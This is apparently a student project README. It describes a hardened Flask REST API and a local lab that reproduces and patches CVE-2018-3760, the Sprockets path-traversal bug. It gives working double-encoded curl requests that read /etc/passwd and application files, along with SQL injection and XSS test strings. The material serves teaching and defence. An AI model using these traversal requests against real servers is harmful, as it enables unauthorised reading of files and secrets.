# secure-api

A small but deliberately hardened REST API written with **Python 3 / Flask**, built for
*Work 1 — Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis*
(Information Security, Hangzhou Dianzi University).

The repository contains two deliverables:

1. the secure API (`app.py`, `tests/`) with a security pipeline (`/.github/workflows/ci.yml`);
2. the CVE laboratory (`cve/`): a vulnerable Ruby on Rails + Sprockets environment
   reproducing **CVE-2018-3760**, the patch that fixes it, and the scripts used to verify
   both states.

---

## 1. Project and API

| Method | Path | Auth | Purpose |
|--------|------|------|---------|
| `POST` | `/api/register` | – | create an account (username + password) |
| `POST` | `/auth/login` | – | verify credentials, return a JWT |
| `GET` | `/api/data` | Bearer JWT | list registered users |
| `POST` | `/api/messages` | Bearer JWT | store a message authored by the token subject |
| `GET` | `/api/messages` | Bearer JWT | list messages, HTML-escaped |
| `GET` | `/health` | – | liveness probe |

Data is stored in SQLite (`app.db`, created on first start, ignored by git).

### Running locally

```powershell
python -m venv venv
.\venv\Scripts\Activate.ps1
pip install -r requirements.txt
$env:SECRET_KEY = "a-random-64-character-secret-used-to-sign-jwts"
python app.py
```

The server listens on `http://127.0.0.1:5000`.

### Calling the API

```bash
# 1. register
curl -s -X POST http://127.0.0.1:5000/api/register \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"Passw0rd!"}'

# 2. log in and keep the token
TOKEN=$(curl -s -X POST http://127.0.0.1:5000/auth/login \
        -H "Content-Type: application/json" \
        -d '{"username":"alice","password":"Passw0rd!"}' | jq -r .token)

# 3. protected endpoint, without a token -> 401
curl -s http://127.0.0.1:5000/api/data

# 4. protected endpoint, with a token -> 200
curl -s http://127.0.0.1:5000/api/data -H "Authorization: Bearer $TOKEN"

# 5. own endpoint: store and read a message
curl -s -X POST http://127.0.0.1:5000/api/messages \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"body":"hello"}'
curl -s http://127.0.0.1:5000/api/messages -H "Authorization: Bearer $TOKEN"
```

![API smoke test](docs/api-curl.png)

---

## 2. Security measures

### 2.1 SQL injection (OWASP A03:2021)

Every statement is a **prepared statement** and user input is bound as a parameter:

```python
conn.execute(
    "SELECT username, password_hash FROM users WHERE username = ?",
    (username,),
)
conn.execute(
    "INSERT INTO users (username, password_hash, created_at) VALUES (?, ?, ?)",
    (username, password_hash, now_iso()),
)
```

No user-controlled value is ever concatenated into SQL text, so a payload such as
`dave' OR '1'='1' --` is treated as a literal username and the login fails with `401`
(covered by `tests/test_api.py::test_sql_injection_does_not_bypass_login`).

![SQL injection attempt is rejected](docs/sqli-attempt.png)

### 2.2 Cross-site scripting (OWASP A03:2021)

All user-controlled fields are HTML-escaped with `markupsafe.escape()` immediately before
they are placed in a response:

```python
messages = [
    {
        "author": str(escape(row["author"])),
        "body": str(escape(row["body"])),
        ...
    }
]
```

A stored `<script>alert('xss')</script>` is returned as
`&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;`, so even a client that renders the
value as HTML cannot execute it. Input is additionally constrained: usernames must match
`^[A-Za-z0-9_.-]{3,32}$`, message bodies are limited to 500 characters, and every response
carries `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` and
`Cache-Control: no-store`.

### 2.3 Authentication (OWASP A07:2021)

* **Password storage** – `bcrypt` with cost factor 12; the hash is never returned by any
  endpoint and the database never contains a plaintext password.
* **Token issuing** – `POST /auth/login` returns a short-lived (1 h) HS256 JWT with
  `sub`, `iat`, `exp` and a random `jti`.
* **Token verification** – the `token_required` middleware rejects a missing, malformed,
  expired or wrongly signed token with `401` before the view function runs.
* **Secret management** – the signing key comes from the `SECRET_KEY` environment
  variable; when it is absent a random key is generated at start-up (development only).
* **User enumeration** – unknown user and wrong password produce the same
  `{"error": "invalid credentials"}` answer.

![Protected endpoint without a token](docs/no-token-401.png)
![Protected endpoint with a valid token](docs/with-token-200.png)

---

## 3. CI/CD pipeline

`.github/workflows/ci.yml` runs on every push and pull request to `main` and contains
three jobs:

| Job | Tool | What it proves |
|-----|------|----------------|
| `Tests - pytest` | pytest | the API still behaves correctly (functional regression) |
| `SAST - Bandit` | bandit 1.9 | no hard-coded secrets, no `debug=True`, no unsafe calls in the code |
| `SCA - pip-audit` | pip-audit 2.10 | no known vulnerable dependency versions |

Bandit and pip-audit reports are uploaded as workflow artefacts
(`bandit-report`, `pip-audit-report`).

![GitHub Actions: all jobs green](docs/ci-green.png)

---

## 4. CVE-2018-3760 — path traversal in Sprockets

### 4.1 The vulnerability

| | |
|---|---|
| **CVE** | CVE-2018-3760 |
| **Component** | Ruby on Rails asset pipeline — `sprockets` gem |
| **Affected** | sprockets 2.x < 2.12.5, 3.x < 3.7.2, 4.x < 4.0.0.beta8 |
| **Fixed in** | 2.12.5 / 3.7.2 / 4.0.0.beta8 |
| **Impact** | arbitrary file read outside the asset root (information disclosure), CVSS 7.5 |
| **Environment** | Vulhub `rails/CVE-2018-3760`, image `vulhub/rails:5.0.7`, app at `/usr/src/blog` |

Rails serves compiled assets through Sprockets. Sprockets accepts `file://` URIs as asset
names, and it URL-decodes the path **twice**: once when the request is parsed, and again
when the `file:` URI is resolved. A request containing `%252e%252e/` therefore passes the
first check as the harmless literal `%2e%2e/` and only turns into `../` on the second
decode — after the "is this path inside an asset directory?" validation has already
happened. The `../` sequences are then resolved by the filesystem, which lets the attacker
walk out of `/usr/src/blog/app/assets/images` and read any file the Rails process can read.

The first request to `/assets/file:%2f%2f/etc/passwd` fails, but the error page helpfully
lists the allowed asset directories, which is the starting point for the traversal.
Screenshots of both steps are shown below.

### 4.2 Reproducing the attack (vulnerable version)

```bash
cd cve
docker compose up -d          # starts vulhub/rails:5.0.7 on http://localhost:3000
```

1. Probe the asset root — the error lists the directories that may be used as a base:

```bash
curl -s "http://localhost:3000/assets/file:%2f%2f/etc/passwd"
```

![Allowed asset directories in the error page](docs/cve-1-error.png)

2. Walk out of `/usr/src/blog/app/assets/images` with six `%252e%252e/` segments and read
   `/etc/passwd`:

```bash
curl -s "http://localhost:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
```

![Arbitrary file read: /etc/passwd](docs/cve-2-passwd.png)

3. The same primitive reads the application source and its secrets, for example
   `/usr/src/blog/config/database.yml` or `/usr/src/blog/Gemfile`:

```bash
curl -s "http://localhost:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/usr/src/blog/Gemfile"
```

![Reading the application Gemfile outside the asset root](docs/cve-3-gemfile.png)

### 4.3 Root cause

* **Wrong order of operations (parser differential).** Sprockets decodes the URI, validates
  the path, and only later decodes the remaining percent-escapes while resolving the
  `file:` scheme. Validation and use see two different strings — the classic
  "check-then-decode" bug described by Orange Tsai in *Breaking Parser Logic*.
* **Path normalisation without a root check.** `PathUtils#normalize_path` collapses `..`
  segments but the result is not compared against the set of allowed load paths, so a
  normalised path outside the project is still opened.
* **`file://` taken from untrusted input.** The asset name in the URL is attacker
  controlled and is passed to `File.read` without restricting it to the configured
  `assets.paths`.

### 4.4 The fix

The patch upgrades Sprockets from 3.7.1 to the fixed 3.7.2 release
(`cve/fixed/Dockerfile`). In 3.7.2 the `file:` URI resolution decodes the path exactly
once, normalises it, and rejects any result that is not contained in one of the configured
load paths, so `%252e%252e/` stays a literal directory name instead of becoming `../`.

```bash
cd cve
docker compose -f docker-compose.fixed.yml up -d --build   # patched image, same port
```

The patch is intentionally limited to the Sprockets version pin — nothing else in the
application changes, which is what a real-world remediation of this CVE looks like.

### 4.5 Proof that the vulnerability is eliminated

The exact requests of section 4.2 are replayed against the patched container:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
# 404 (previously 200 with the content of /etc/passwd)

curl -s "http://localhost:3000/" | head -n 5    # the blog itself still works (regression test)
```

![Patched server rejects the traversal](docs/cve-4-fixed-404.png)
![Regression test: the application still serves its pages](docs/cve-5-regression.png)

| Request | Vulnerable 3.7.1 | Patched 3.7.2 |
|---------|------------------|---------------|
| `/assets/file:%2f%2f/etc/passwd` | `500`, error lists asset paths | `500`, no path list |
| `.../images/%252e%252e/…/etc/passwd` | `200`, file content | `404` |
| `GET /` | `200` | `200` |
| `GET /assets/application.css` | `200` | `200` |

---

## 5. Repository layout

```
.
├── app.py                     # the secure API
├── requirements.txt
├── tests/                     # pytest suite (functional + security regressions)
├── .github/workflows/ci.yml   # Bandit + pip-audit + pytest
├── docs/                      # screenshots used in this README and in the report
└── cve/
    ├── docker-compose.yml         # vulnerable: vulhub/rails:5.0.7 (sprockets 3.7.1)
    ├── docker-compose.fixed.yml   # patched:    sprockets 3.7.2
    ├── fixed/Dockerfile
    ├── exploit.sh                 # reproduces CVE-2018-3760
    └── verify-fix.sh              # replays the attack against the patched build
```
